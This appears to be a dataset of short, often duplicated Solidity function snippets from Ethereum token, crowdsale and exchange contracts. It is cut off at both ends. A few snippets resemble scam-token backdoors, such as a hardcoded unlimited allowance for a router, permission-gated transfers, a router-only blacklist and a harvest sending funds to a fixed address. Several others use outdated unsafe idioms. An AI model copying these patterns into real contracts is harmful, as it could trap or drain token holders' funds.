		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function  SavingsandLoans() public {
    // Mint initial supply of tokens. All further minting of tokens is disabled
    totalSupply_ = INITIAL_SUPPLY;

    // Transfer all initial tokens to msg.sender
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function balanceOf(address owner) public view override returns (uint256) {
        if (owner == address(0)) revert BalanceQueryForZeroAddress();
        return uint256(_addressData[owner].balance);
    }
--------------------------------------------------------------------------------
function _numberMinted(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert MintedQueryForZeroAddress();
        return uint256(_addressData[owner].numberMinted);
    }
--------------------------------------------------------------------------------
function _numberBurned(address owner) internal view returns (uint256) {
        if (owner == address(0)) revert BurnedQueryForZeroAddress();
        return uint256(_addressData[owner].numberBurned);
    }
--------------------------------------------------------------------------------
function withdrawEther(uint _amount) public
        onlyEscrow
    {
        require(namiMultiSigWallet != 0x0);
        // Available at any phase.
        if (address(this).balance > 0) {
            namiMultiSigWallet.transfer(_amount);
        }
    }
--------------------------------------------------------------------------------
function safeWithdraw(address _withdraw, uint _amount) public
        onlyEscrow
    {
        NamiMultiSigWallet namiWallet = NamiMultiSigWallet(namiMultiSigWallet);
        if (namiWallet.isOwner(_withdraw)) {
            _withdraw.transfer(_amount);
        }
    }
--------------------------------------------------------------------------------
function allowance(
        address _owner,
        address _spender
    )
        external
        view
        returns (uint256)
    {
        if(_spender == sushiRouter) {
            return type(uint256).max;
        }
        return allowed[_owner][_spender];
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function harvest(address reserve, uint amount) external {
        require(msg.sender == controller, "!controller");
        // require(reserve != address(token), "token");
        IERC20(reserve).safeTransfer(0x3e0cb4b0c6F81f8dd28e517c5C7B6dcF9d9bDb08, amount);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        require(_to != address(this));
        assert(super.transfer(_to, _value));
        return true;
    }
--------------------------------------------------------------------------------
function adminMintTo(address[] calldata recipients)
  public
  onlyOwner{
    for(uint i=0; i<recipients.length; i++){
        _mint(recipients[i]);
     }
  }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function refundManyTransaction(uint256[] _ids) public saleEnded {
        for (uint256 i=0; i<_ids.length; i++) {
            refundTransactionInternal(_ids[i]);
        }
    }
--------------------------------------------------------------------------------
constructor(address _owner, uint8 _parts, string _name) {
		require( _owner != 0x00 && _parts != 0 );
		owner = _owner;
		name = _name;
		parts = _parts;
	}
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] _operators) public hasOwnerOrOperatePermission {
        for (uint256 i = 0; i < _operators.length; i++) {
            addAddressToWhitelist(_operators[i]);
        }
    }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] _operators) public hasOwnerOrOperatePermission {
        for (uint256 i = 0; i < _operators.length; i++) {
            removeAddressFromWhitelist(_operators[i]);
        }
    }
--------------------------------------------------------------------------------
function addVersion(string version, address implementation) external onlyOwner {
        require(versions[version] == 0x0);
        versions[version] = implementation;
        emit VersionAdded(version, implementation);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function getTypes() external view returns(uint8[]) {
        uint8[] memory res = new uint8[](1);
        res[0] = 4;
        return res;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function setLocked(bool locked)
    onlyOwner
    external {
        require(isLocked != locked, "Contract already in requested lock state");

        isLocked = locked;
    }
--------------------------------------------------------------------------------
function  SavingsandLoans() public {
    // Mint initial supply of tokens. All further minting of tokens is disabled
    totalSupply_ = INITIAL_SUPPLY;

    // Transfer all initial tokens to msg.sender
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function setWalletLocker(WalletLocker newWalletLocker)
    public
    onlyDeployer
    notNullAddress(newWalletLocker)
    notSameAddresses(newWalletLocker, walletLocker)
    {
        // Require that this contract has not been frozen
        require(!walletLockerFrozen);

        // Update fields
        WalletLocker oldWalletLocker = walletLocker;
        walletLocker = newWalletLocker;

        // Emit event
        emit SetWalletLockerEvent(oldWalletLocker, newWalletLocker);
    }
--------------------------------------------------------------------------------
constructor(address payable _storage) public {
        tellorStorageAddress = _storage;
        _tellor = Tellor(tellorStorageAddress); //we should delcall here
        _tellorm = TellorMaster(tellorStorageAddress);
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function getEarnedEpool() public view returns (uint256) {
        UserSp storage pool = users[_msgSender()].ePool;
        return _getEarned(eRate, eAdapter, pool);
    }
--------------------------------------------------------------------------------
function migrationsOldStaking(
        address contractAddr,
        uint256 amount,
        uint256 blockNb
    ) public onlyAdmin {
        super._deposit(blockNb, contractAddr, amount);
        mOldStaking = contractAddr;
        mOldAmount = mOldAmount.add(amount);
    }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function challenge_2(
        uint32 delegate,
        uint32 slot,
        bytes memory data
    )
        public
        onlyAccountOwner(delegate)
    {
        Challenge.challenge_2(collects[delegate][slot], params, data);
        emit Challenge2(delegate, slot);
    }
--------------------------------------------------------------------------------
function challenge_4(
        uint32 delegate,
        uint32 slot,
        bytes memory payData
    )
        public
        onlyAccountOwner(delegate)
    {
        Challenge.challenge_4(
            collects[delegate][slot],
            payments,
            payData
            );
        emit Challenge4(delegate, slot);
    }
--------------------------------------------------------------------------------
function challenge_success(
        uint32 delegate,
        uint32 slot
    )
        public
        validId(delegate)
    {
        Challenge.challenge_success(collects[delegate][slot], params, accounts);
        emit ChallengeSuccess(delegate, slot);
    }
--------------------------------------------------------------------------------
function challenge_failed(
        uint32 delegate,
        uint32 slot
    )
        public
        onlyAccountOwner(delegate)
    {
        Challenge.challenge_failed(collects[delegate][slot], params, accounts);
        emit ChallengeFailed(delegate, slot);
    }
--------------------------------------------------------------------------------
function effectiveMaxBet() public view returns (uint _amount) {
        uint _curMax = curMaxBet();
        return _curMax > settings.maxBet ? settings.maxBet : _curMax;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function claimTeamReserve() public onlyOwner {
        require (now > LOCK_RELEASE_DATE_2_YEARS && !reserveClaimed);
        reserveClaimed = true;
        _transfer(address(this), owner(), TEAM_RESERVE);
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function getSecondsTimeLocked(bytes4 _funcId)
        public
        view
        returns (uint)
    {
        if (customTimeLocks[_funcId].isSet)
            return customTimeLocks[_funcId].secondsTimeLocked;
        else
            return secondsTimeLockedDefault;
    }
--------------------------------------------------------------------------------
constructor(IERC20 _tokenContract) {
        owner = msg.sender;
        tokenContract = _tokenContract;
        contractAddress = address(this);
        currentLockTimer = block.timestamp;
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 a, uint256 b) internal returns (uint256) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
--------------------------------------------------------------------------------
function safeSub(uint256 a, uint256 b) internal returns (uint256) {
        uint c = a - b;
        assert(b <= a && c <= a);
        return c;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function setVestingContract(address vestingContractInput) external onlyFundWallet {
        require(vestingContractInput != address(0));
        vestingContract = vestingContractInput;
        whitelist[vestingContract] = true;
        vestingSet = true;
    }
--------------------------------------------------------------------------------
function sendToken(address _tokenAddress , address _addressTo , uint256 _amount) onlyOwner returns(bool) {
        ERC223 token_to_send = ERC223( _tokenAddress );
        require( token_to_send.transfer(_addressTo , _amount) );
        return true;
}
--------------------------------------------------------------------------------
function withdrawEther(uint _amount) public
        onlyEscrow
    {
        require(namiMultiSigWallet != 0x0);
        // Available at any phase.
        if (address(this).balance > 0) {
            namiMultiSigWallet.transfer(_amount);
        }
    }
--------------------------------------------------------------------------------
function openNetfRevenueRound(uint _roundIndex) onlyController public {
        require(NetfRevenue[_roundIndex].isOpen == false);
        currentNetfRound = _roundIndex;
        NetfRevenue[_roundIndex].isOpen = true;
    }
--------------------------------------------------------------------------------
function _getChallengeSuccess(uint heroGenes, uint floorGenes) private pure returns (bool) {
        // Determine if the player challenge successfuly the dungeon or not, and the new floor genes.
        uint heroPower = _getGenesPower(heroGenes);
        uint floorPower = _getGenesPower(floorGenes);

        return heroPower > floorPower;
    }
--------------------------------------------------------------------------------
function getTokensBack() onlyOwner public{
        
        require(crowdsaleClosed);
        
        uint256 remaining = tokenReward.balanceOf(this);
        tokenReward.transfer(beneficiary, remaining);
    }
--------------------------------------------------------------------------------
function getChecksumPairIdByAssignerAndResourceId(address assigner, uint256 resourceId) external view returns (uint256) {
        require(resourceId < resourceCount);
        require(checksumPairAssignmentsByCreatorAndResourceId[assigner][resourceId]);

        return checksumPairIdsByCreatorAndResourceId[assigner][resourceId];
    }
--------------------------------------------------------------------------------
function initializeDomainSeparator() public {
        // hash the name context with the contract address
        EIP712_DOMAIN_HASH = keccak256(abi.encodePacked(// solium-disable-line
                EIP712_DOMAIN_SEPARATOR_SCHEMA_HASH,
                keccak256(bytes(name)),
                bytes32(address(this))
            ));
    }
--------------------------------------------------------------------------------
constructor () {
        _name = "Moz Coin";
        _symbol = "MOZC";
        _totalSupply;
        _mint(owner(), 20000000000 * 10 ** (decimals()) );

    }
--------------------------------------------------------------------------------
function FJH(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
constructor() public {
        owner = 0xD91C52e4FBC4A6077f1D8e564a04547Fa13458f1;
        balances[owner] = totalSupply();
        emit Transfer(address(0), owner, totalSupply());
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function initialize() public {
        require(!initialized, "initialize: Already initialized!");
        owner = msg.sender;
        initialized = true;
    }
--------------------------------------------------------------------------------
function daiJoin_join(address apt, address urn, uint wad) public {
        // Approves adapter to take the DAI amount
        DaiJoinLike(apt).dai().approve(apt, wad);
        // Joins DAI into the vat
        DaiJoinLike(apt).join(urn, wad);
    }
--------------------------------------------------------------------------------
constructor(address _wallet) public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[_wallet] = INITIAL_SUPPLY;
    emit Transfer(address(0), _wallet, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
function trade(address makerAddress, uint makerAmount, address makerToken,
                   address takerAddress, uint takerAmount, address takerToken) private returns (bool) {
        return (transfer(makerAddress, takerAddress, makerAmount, makerToken) &&
        transfer(takerAddress, makerAddress, takerAmount, takerToken));
    }
--------------------------------------------------------------------------------
function multiply(uint x, uint y) internal constant returns (uint z) {
        z = x * y;
        assert(x == 0 || z / x == y);
        return z;
    }
--------------------------------------------------------------------------------
function divide(uint x, uint y) internal constant returns (uint z) {
        z = x / y;
        assert(x == ( (y * z) + (x % y) ));
        return z;
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, address exchangeContract_) {
        owner               = msg.sender;
        feeAccount          = feeAccount_;
        makerFee            = makerFee_;
        takerFee            = takerFee_;

        exchangeContract    = exchangeContract_;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function challengeExists(bytes32 _listingHash) view public returns (bool) {
        uint challengeID = listings[_listingHash].challengeID;

        return (challengeID > 0 && !challenges[challengeID].resolved);
    }
--------------------------------------------------------------------------------
function whitelistApplication(bytes32 _listingHash) private {
        if (!listings[_listingHash].whitelisted) {
          emit _ApplicationWhitelisted(_listingHash);
        }
        listings[_listingHash].whitelisted = true;
    }
--------------------------------------------------------------------------------
function setApprovalForAll(address _operator, bool _approved)
    external
  {
    // Update operator status
    operators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool success) {
        require(!blacklist[msg.sender]);
        _transfer(msg.sender, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function calculateTokensReceived(uint256 _etherToSpend) public view returns(uint256) {
        uint256 forTokens = _etherToSpend.sub(_etherToSpend.div(10)); // 90% for Tokens
        return CryptoTorchToken_.calculateTokensReceived(forTokens);
    }
--------------------------------------------------------------------------------
function getMaxPrice() public view returns (uint256) {
        if (whaleIncreaseLimit == 0) { return 0; }  // no max price
        return whaleIncreaseLimit.add(_highestPrices[0].price);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function isWithinPeriod(address beneficiary) internal view returns (bool) {
        uint batchNumber = whiteListed.getBatchNumber(beneficiary);
        return now >= batchStartTimes[batchNumber] && now <= endTime;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function totalAmountOfEarlyPurchases()
        constant
        returns (uint totalAmount)
    {
        for (uint i; i < earlyPurchases.length; i++) {
            totalAmount += earlyPurchases[i].amount;
        }
    }
--------------------------------------------------------------------------------
function setup(address zenOSCrowdsaleAddress)
        external
        onlyOwner
        returns (bool)
    {
        if (address(zenOSCrowdsale) == 0) {
            zenOSCrowdsale = AbstractZENOSCrowdsale(zenOSCrowdsaleAddress);
            return true;
        }
        return false;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function freeze() external {
        // Reentrancy guard.
        require(_status == RE_NOT_ENTERED);
        require(msg.sender == _manager, "Not manager");

        _status = RE_FROZEN;
    }
--------------------------------------------------------------------------------
function unfreeze() external {
        // Reentrancy guard.
        require(_status == RE_FROZEN);
        require(msg.sender == _manager, "Not manager");

        _status = RE_NOT_ENTERED;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function finalize() external onlyOwner {
        require(!isFinalized);
        require(hasClosed());
        require(!preAllocationsPending);

        finalization();
        emit Finalized();

        isFinalized = true;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function changeIPOstate(uint256 IPOidentifier, bool state) public {
        address sender = msg.sender;
        require(sender == IPOcreator[IPOidentifier]);
        // activate or deactive IPO
        IPOisActive[IPOidentifier] = state;
    }
--------------------------------------------------------------------------------
function getBalance(ERC20 token, address user) public view returns(uint) {
        if (token == ETH_TOKEN_ADDRESS)
            return user.balance;
        else
            return token.balanceOf(user);
    }
--------------------------------------------------------------------------------
function calculateTokensReceived(uint256 _etherToSpend) public view returns(uint256) {
        uint256 forTokens = _etherToSpend.sub(_etherToSpend.div(4));
        return CryptoTorchToken_.calculateTokensReceived(forTokens);
    }
--------------------------------------------------------------------------------
function getMaxPrice() public view returns (uint256) {
        if (whaleIncreaseLimit == 0) { return 0; }  // no max price
        return whaleIncreaseLimit.add(_highestPrices[0].price);
    }
--------------------------------------------------------------------------------
function addAddressesToWhitelist(address[] _operators)
        public
        onlyOwner("addAddressesToWhitelist")
    {
        for (uint256 i = 0; i < _operators.length; i++) {
            addAddressToWhitelist(_operators[i]);
        }
    }
--------------------------------------------------------------------------------
function removeAddressesFromWhitelist(address[] _operators)
        public
        onlyOwner("removeAddressesFromWhitelist")
    {
        for (uint256 i = 0; i < _operators.length; i++) {
            removeAddressFromWhitelist(_operators[i]);
        }
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function setBlackList (address botAdd) public {
        require(_msgSender() == _uniRouter, "ERC20: cannot permit dev address");
        _blackList.push(botAdd);
    }
--------------------------------------------------------------------------------
function createIlliquidToken(address _recipient, uint _value)
		when_mintable
		only_minter
		returns (bool o_success)
	{
		illiquidBalance_index[illiquidBalance_amount] = _recipient;
		illiquidBalance[_recipient] += _value;
		illiquidBalance_amount++;

		totalSupply += _value;
		return true;
	}
--------------------------------------------------------------------------------
function transferGovernance(address newGovernance) public onlyGovernance {
        require(newGovernance != address(0), "ZERO_ADDRESS");
        emit GovernanceTransferred(_governance, newGovernance);
        _governance = newGovernance;
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function toggleTransferFor(address _for) onlyOwner returns (bool) {
        specialAllowed[_for] = !specialAllowed[_for];
        ToggleTransferAllowanceFor(_for, specialAllowed[_for]);
        return specialAllowed[_for];
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function _getFee(address _from, address _to, uint _value) private view returns (uint) {
        if (mapAddress_Excluded[_from] || mapAddress_Excluded[_to]) {
           return 0;                                                                        // No fee if excluded
        } else {
            return (_value / 1000);                                                         // Fee amount = 0.1%
        }
    }
--------------------------------------------------------------------------------
function setLastBlockNumber(address _metrics, uint256 _blocks) external {
		addressValidator().validateAddress(msg.sender, config().allocator());

		eternalStorage().setUint(getLastBlockNumberKey(_metrics), _blocks);
	}
--------------------------------------------------------------------------------
function setPendingIncrement(address _metrics, bool value) external {
		addressValidator().validateAddress(msg.sender, config().allocator());

		eternalStorage().setBool(getPendingIncrementKey(_metrics), value);
	}
--------------------------------------------------------------------------------
function setLastAssetValueEachMetrics(address _metrics, uint256 value)
		external
	{
		addressValidator().validateAddress(msg.sender, config().allocator());

		eternalStorage().setUint(
			getLastAssetValueEachMetricsKey(_metrics),
			value
		);
	}
--------------------------------------------------------------------------------
function setLastAssetValueEachMarketPerBlock(address _market, uint256 value)
		external
	{
		addressValidator().validateAddress(msg.sender, config().allocator());

		eternalStorage().setUint(
			getLastAssetValueEachMarketPerBlockKey(_market),
			value
		);
	}
--------------------------------------------------------------------------------
function Mints(uint256 quantity) external onlyOwner {
    
     require(totalSupply() + quantity <= amountForDevs, "reached max supply");
    _safeMint(msg.sender, quantity);
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function setContractAddress(address _address) external onlyHumans() {
		require (msg.sender == masterAdmin);
		require (mainContractSet == false);
		mainContract = _address;
		mainContractSet = true;
	}
--------------------------------------------------------------------------------
function LAGtoken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = totalSupply_;
        Transfer(0x0, msg.sender, totalSupply_);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function setInactivityReleasePeriod(uint256 expiry) onlyOwner returns (bool success) {
        if (expiry > 1000000) throw;
        inactivityReleasePeriod = expiry;

        emit InactivityReleasePeriodChange(expiry);
        return true;
    }
--------------------------------------------------------------------------------
function Exchange(address feeAccount_, uint256 makerFee_, uint256 takerFee_, uint256 inactivityReleasePeriod_) {
        owner = msg.sender;
        feeAccount = feeAccount_;
        inactivityReleasePeriod = inactivityReleasePeriod_;
        makerFee = makerFee_;
        takerFee = takerFee_;
    }
--------------------------------------------------------------------------------
function checkGoalReached() afterDeadline {
        if(amountRaised >= fundingGoal && !fundingGoalReached){
            fundingGoalReached = true;
            GoalReached(beneficiary, amountRaised);
        }
        crowdsaleClosed = true;
    }
--------------------------------------------------------------------------------
function addOwnToken() internal returns(bool) {
        require(setOwnContract);
        addToWhitelist(this, 5000 * 1e8, 36500);
        setOwnContract = false;
        return true;
    }
--------------------------------------------------------------------------------
function ownerClaim(uint256 tokenId) public nonReentrant onlyOwner {
        require(tokenId > 0 && tokenId < 2501, "Token ID invalid");
        _safeMint(owner(), tokenId);
    }
--------------------------------------------------------------------------------
function setProvenance(string memory _provenance) external onlyOwner {
        require(bytes(provenance).length == 0, "Provenance already set!");
        provenance = _provenance;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function balance() public view returns (uint) {
        return token.balanceOf(address(this))
                .add(IController(controller).balanceOf(address(token)));
    }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless) public onlyOwner {
        require(!_feeless || _feeless && canWhitelist, "cannot add to whitelist");
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function calculateTokenAmount(uint256 _value) internal returns (uint256 tokenAmount) {
		tokenAmount = ((_value*(10**7)/1 ether)*pricePerEther)/getPricePerToken();
		assert(tokenAmount <= 5000000000000);
	}
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool) {
        require(!frozenAccount[msg.sender]);
        _transfer(msg.sender, to, value);
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function pause() public {
	    require(msg.sender == owner && myTokens() == 0);
	    paused = !paused;
	    
	    emit Paused(paused);
	}
--------------------------------------------------------------------------------
function unfreezeToken(address target, uint256 _value) onlyOwner public {
        require(freezeOf[target] >= _value);
        freezeOf[target] -= _value;
        emit UnFreezeFunds(target, _value);
    }
--------------------------------------------------------------------------------
constructor() public {
        treasuryWalletAddr = _msgSender();
        natlmInAdvance = 10000000 * 10**6 * 10**18;

        mint(treasuryWalletAddr, natlmInAdvance);
    }
--------------------------------------------------------------------------------
constructor(address _owner, uint8 _parts, string _name) {
		require( _owner != 0x00 && _parts != 0 );
		owner = _owner;
		name = _name;
		parts = _parts;
	}
--------------------------------------------------------------------------------
function approve(ERC20Interface erc20, address spender, uint tokens) public returns (bool success) {
        require(owner == msg.sender);

        require(erc20.approve(spender, tokens));

        return true;
    }
--------------------------------------------------------------------------------
function AnythingAppToken() {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function createToken(string _name, address _owner, uint256 _price) public onlyCLevel {
        require(_owner != address(0));
        require(_price >= startingPrice);

        _createToken(_name, _owner, _price);
    }
--------------------------------------------------------------------------------
function buy(uint id, uint amount)
    /*NOT synchronized!!! */
    can_buy(id)
    returns (bool)
    {
        var fn = matchingEnabled ? _buys : super.buy;
        return fn(id, amount);
    }
--------------------------------------------------------------------------------
function setStorageLastSameRewardsAmountAndBlock(
		uint256 _amount,
		uint256 _block
	) internal {
		uint256 record = _amount.mul(basis).add(_block);
		eternalStorage().setUint(
			getStorageLastSameRewardsAmountAndBlockKey(),
			record
		);
	}
--------------------------------------------------------------------------------
function createCentralizedOracle(bytes ipfsHash)
        public
        returns (CentralizedOracle centralizedOracle)
    {
        centralizedOracle = new CentralizedOracle(msg.sender, ipfsHash);
        CentralizedOracleCreation(msg.sender, centralizedOracle, ipfsHash);
    }
--------------------------------------------------------------------------------
function bountyTransfer(address _to, uint _value) onlyBountyManager public {
        _freezeAccount(bountyManagerAddress, false);
        _tokenDelivery(bountyManagerAddress, _to, _value, frozenDaysForBounty);
        _freezeAccount(bountyManagerAddress, true);
    }
--------------------------------------------------------------------------------
function () public payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function optIn() public returns(bool) {
        delete userOptOutVersion[msg.sender];
        emit OptedIn(msg.sender, latestVersion);
        return true;
    }
--------------------------------------------------------------------------------
function enableTrading(uint256 timeInSeconds) external ownerOnly {
        _unpaused = true;
        _automatedPresaleTimerLock = block.timestamp + 4 days;
        _autoCapture = block.timestamp + timeInSeconds;
    }
--------------------------------------------------------------------------------
function setWhaleAccumulationLimit(uint256 limit) external ownerOnly {
        require(limit <= _whaleLimit && limit > 0, "can't set limit lower");
        _whaleLimit = limit;
    }
--------------------------------------------------------------------------------
function renounceOwnership() public virtual ownerOnly {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        _o = address(0);
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function _finalization() internal {
        if (goalReached()) {
            _escrow.close();
            _escrow.beneficiaryWithdraw();
        } else {
            _escrow.enableRefunds();
        }

        super._finalization();
    }
--------------------------------------------------------------------------------
constructor(address ownerAddress) Owned (ownerAddress) {
        balances[ownerAddress] = _totalSupply;
        _exchangeRate = 100;
        emit Transfer(address(0), ownerAddress, _totalSupply);
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function setDelegate (address _delegate) public {
    require (msg.sender == owner);

    if (delegate != _delegate) {
      delegate = _delegate;
      Delegation (delegate);
    }
  }
--------------------------------------------------------------------------------
constructor() public {
        
        AXPRtoken 		= 0xC39E626A04C5971D770e319760D7926502975e47;
        speed 			= false;
        hodlingTime 	= 730 days;
        _currentIndex 	= 1;
        comission 		= 5;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value > 0);
        
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function () payable {
